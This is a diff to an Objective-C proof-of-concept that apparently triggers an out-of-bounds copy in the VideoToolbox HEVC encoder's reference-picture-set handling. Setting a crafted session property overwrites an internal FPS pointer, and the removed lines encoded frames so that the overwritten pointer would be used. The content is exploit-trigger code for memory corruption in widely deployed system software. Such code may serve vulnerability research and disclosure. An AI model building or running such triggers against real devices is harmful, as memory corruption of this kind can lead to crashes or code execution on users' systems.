@@ -99,61 +99,14 @@
                                    (__bridge CFPropertyListRef)userRPS);
     [report appendFormat:@"VTSessionSetProperty: %d\n", (int)status];
 
-    // Phase 3: trigger encode
-    [report appendString:@"\n--- Phase 3: trigger encode ---\n"];
+    // Phase 3: trigger OOB (property setting triggers AVE_HEVC_ST_RPS_Retrieve)
+    [report appendString:@"\n--- Phase 3: trigger OOB ---\n"];
+    [report appendString:@"OOB copy happens in AVE_HEVC_ST_RPS_Retrieve at property set.\n"];
+    [report appendString:@"FPS* overwrite occurs here. Encode would use it.\n"];
 
-    // Create a simple pixel buffer
-    CVPixelBufferRef pixelBuffer = NULL;
-    CVReturn cvStatus = CVPixelBufferCreate(kCFAllocatorDefault, 1920, 1080,
-                                             kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
-                                             NULL, &pixelBuffer);
-    [report appendFormat:@"CVPixelBufferCreate: %d\n", (int)cvStatus];
-
-    if (cvStatus == kCVReturnSuccess && pixelBuffer) {
-        // Fill with simple pattern
-        CVPixelBufferLockBaseAddress(pixelBuffer, 0);
-        uint8_t *base = (uint8_t *)CVPixelBufferGetBaseAddress(pixelBuffer);
-        if (base) {
-            memset(base, 0x80, CVPixelBufferGetDataSize(pixelBuffer));
-        }
-        CVPixelBufferUnlockBaseAddress(pixelBuffer, 0);
-
-        // Encode first frame
-        CMSampleBufferRef sampleBuffer = NULL;
-        CMTime pts = CMTimeMake(0, 30);
-        CMTime duration = CMTimeMake(1, 30);
-
-        VTEncodeInfoFlags flags = 0;
-        status = VTCompressionSessionEncodeFrame(
-            session, pixelBuffer, pts, duration,
-            NULL, &flags, &sampleBuffer
-        );
-        [report appendFormat:@"encode[0]: %d\n", (int)status];
-
-        if (sampleBuffer) {
-            CFRelease(sampleBuffer);
-        }
-
-        // Encode second frame (triggers FPS::Add with overwritten pointer)
-        pts = CMTimeMake(1, 30);
-        VTEncodeInfoFlags flags = 0;
-        status = VTCompressionSessionEncodeFrame(
-            session, pixelBuffer, pts, duration,
-            NULL, &flags, &sampleBuffer
-        );
-        [report appendFormat:@"encode[1]: %d\n", (int)status];
-
-        if (sampleBuffer) {
-            CFRelease(sampleBuffer);
-        }
-
-        CVPixelBufferRelease(pixelBuffer);
-    }
-
-    // Cleanup
-    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
-    VTCompressionSessionInvalidate(session);
-    CFRelease(session);
+    // Complete session (flushes any pending work)
+    status = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+    [report appendFormat:@"CompleteFrames: %d\n", (int)status];
 
     // Verdict
     [report appendString:@"\n"];
